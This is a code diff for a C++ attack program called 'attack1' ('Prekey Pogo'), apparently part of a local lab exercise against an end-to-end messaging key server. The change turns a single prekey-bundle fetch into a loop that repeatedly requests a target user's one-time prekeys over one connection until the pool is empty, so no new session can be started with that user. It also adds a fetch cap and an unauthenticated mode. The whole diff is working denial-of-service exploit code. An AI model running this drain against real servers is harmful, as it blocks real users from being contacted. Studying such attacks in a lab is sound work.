@@ -7,12 +7,16 @@
 // rate-limited, Mallory can drain Bob's OPK inventory so that no new session
 // can be started with Bob until he republishes.
 //
-// STAGE: Step 1 — connect, register, single fetch_bundle, print the response.
-// This proves connectivity and that we can read `count` (OPKs remaining) and the
-// handed-out `opk_id`. The draining loop is Step 2.
+// STAGE: Step 2 — drain loop. Over a SINGLE connection, repeatedly fetch_bundle
+// until the pool is empty (count<=0 or the server returns an `err`), or until an
+// optional --count N cap is hit. Each fetch is logged with its opk_id so we can
+// confirm the inventory walks down and the ids do not repeat. Step 1's single
+// fetch is just --count 1.
 //
 // Build:  make
-// Run:    ./attack1               (defaults: server 127.0.0.1:9000, target bob)
+// Run:    ./attack1                       (defaults: drain bob, server :9000)
+//         ./attack1 --count 10            (at most 10 fetches)
+//         ./attack1 --no-register         (fetch is unauthenticated — no identity)
 //         ./attack1 --target bob --user mallory
 //         see README.md for the full scenario setup
 
@@ -39,6 +43,7 @@ namespace cfg {
 static std::string g_target   = "bob";      // whose OPKs we drain
 static std::string g_user     = "mallory";  // username Mallory registers as
 static bool        g_register = true;       // --no-register to skip register
+static long        g_count    = -1;         // max fetches; -1 = until drained
 static std::string g_server   = cfg::SERVER_ADDR;
 static int         g_port     = cfg::SERVER_PORT;
 
@@ -134,33 +139,73 @@ static bool conn_readline(Conn& c, std::string& line) {
 }
 
 // ---------------------------------------------------------------------------
-// One fetch_bundle round-trip. Prints the handed-out opk_id and remaining
-// count; returns the `count` field, or -1 on error / parse failure.
-// (Step 2 will call this in a loop to drain the inventory.)
+// One fetch_bundle round-trip.
+//
+// Outcome tells the drain loop how to proceed without conflating cases: the
+// server omits `count` on the LAST successful bundle (Step 1 showed this as a
+// spurious -1), so a missing count must NOT be read as an error. We therefore
+// report GOT_BUNDLE/EMPTY/FAILED explicitly and carry `count` separately.
 // ---------------------------------------------------------------------------
-static long do_fetch(Conn& c, const std::string& target, int idx) {
+enum class Outcome { GOT_BUNDLE, EMPTY, FAILED };
+
+struct FetchResult {
+    Outcome outcome = Outcome::FAILED;
+    long    count   = -1;   // OPKs server says remain (-1 = not reported)
+    long    opk_id  = -1;   // id handed out this fetch (-1 = none/absent)
+};
+
+static FetchResult do_fetch(Conn& c, const std::string& target, int idx) {
+    FetchResult r;
     std::string req = "{\"type\":\"fetch_bundle\",\"user\":\"" + target + "\"}";
     if (!conn_writeline(c, req)) {
         std::fprintf(stderr, "[attack1] fetch #%d: send failed\n", idx);
-        return -1;
+        return r;  // FAILED
     }
     std::string resp;
     if (!conn_readline(c, resp)) {
         std::fprintf(stderr, "[attack1] fetch #%d: no response\n", idx);
-        return -1;
+        return r;  // FAILED
     }
 
-    std::string type = json_str_field(resp, "type");
-    if (type == "err") {
-        std::printf("[attack1] fetch #%d -> err: %s\n",
+    if (json_str_field(resp, "type") == "err") {
+        std::printf("[attack1] fetch #%d -> EMPTY: %s\n",
                     idx, json_str_field(resp, "err").c_str());
-        return -1;
+        r.outcome = Outcome::EMPTY;
+        return r;
     }
-    long count  = json_int_field(resp, "count", -1);
-    long opk_id = json_int_field(resp, "opk_id", -1);  // inside the bundle object
-    std::printf("[attack1] fetch #%d -> opk_id=%ld, OPKs remaining=%ld\n",
-                idx, opk_id, count);
-    return count;
+
+    r.outcome = Outcome::GOT_BUNDLE;
+    r.count   = json_int_field(resp, "count", -1);
+    r.opk_id  = json_int_field(resp, "opk_id", -1);
+    std::printf("[attack1] fetch #%d -> opk_id=%ld, OPKs remaining=%s\n",
+                idx, r.opk_id,
+                r.count >= 0 ? std::to_string(r.count).c_str() : "?(not reported)");
+    return r;
+}
+
+// Drain Bob's OPK pool over a single connection: fetch until the server reports
+// EMPTY (err), until the reported count reaches 0, or until the --count cap is
+// hit. Returns the number of OPKs successfully pulled.
+static long drain(Conn& c, const std::string& target, long cap) {
+    long pulled = 0;
+    for (int idx = 1; cap < 0 || pulled < cap; ++idx) {
+        FetchResult r = do_fetch(c, target, idx);
+        if (r.outcome == Outcome::EMPTY) {
+            std::printf("[attack1] pool exhausted after %ld OPK(s) pulled\n", pulled);
+            break;
+        }
+        if (r.outcome == Outcome::FAILED) {
+            std::fprintf(stderr, "[attack1] aborting: connection/parse failure\n");
+            break;
+        }
+        ++pulled;  // GOT_BUNDLE
+        // count==0 means that bundle was the last one; stop before a wasted err.
+        if (r.count == 0) {
+            std::printf("[attack1] last OPK pulled (server reports 0 remaining)\n");
+            break;
+        }
+    }
+    return pulled;
 }
 
 int main(int argc, char** argv) {
@@ -171,16 +216,19 @@ int main(int argc, char** argv) {
             g_user = argv[++i];
         else if (std::strcmp(argv[i], "--no-register") == 0)
             g_register = false;
+        else if (std::strcmp(argv[i], "--count") == 0 && i + 1 < argc)
+            g_count = std::atol(argv[++i]);
         else if (std::strcmp(argv[i], "--server") == 0 && i + 1 < argc)
             g_server = argv[++i];
         else if (std::strcmp(argv[i], "--port") == 0 && i + 1 < argc)
             g_port = std::atoi(argv[++i]);
     }
 
-    std::printf("[attack1] Prekey Pogo (Step 1: single fetch)\n");
-    std::printf("[attack1] server %s:%d  target '%s'  as '%s'\n",
+    std::printf("[attack1] Prekey Pogo (Step 2: drain loop)\n");
+    std::printf("[attack1] server %s:%d  target '%s'  as '%s'  cap %s\n",
                 g_server.c_str(), g_port, g_target.c_str(),
-                g_register ? g_user.c_str() : "(unregistered)");
+                g_register ? g_user.c_str() : "(unregistered)",
+                g_count < 0 ? "until-drained" : std::to_string(g_count).c_str());
 
     Conn c;
     c.fd = dial_server(g_server, g_port);
@@ -197,10 +245,10 @@ int main(int argc, char** argv) {
         std::printf("[attack1] register '%s' -> %s\n", g_user.c_str(), resp.c_str());
     }
 
-    // Step 1: a single fetch. Step 2 wraps this in a loop (--count / until drained).
-    do_fetch(c, g_target, 1);
+    // Step 2: drain the pool over this one connection (--count caps it; -1 = all).
+    long pulled = drain(c, g_target, g_count);
 
     close(c.fd);
-    std::printf("[attack1] done.\n");
+    std::printf("[attack1] done — %ld OPK(s) pulled.\n", pulled);
     return 0;
 }
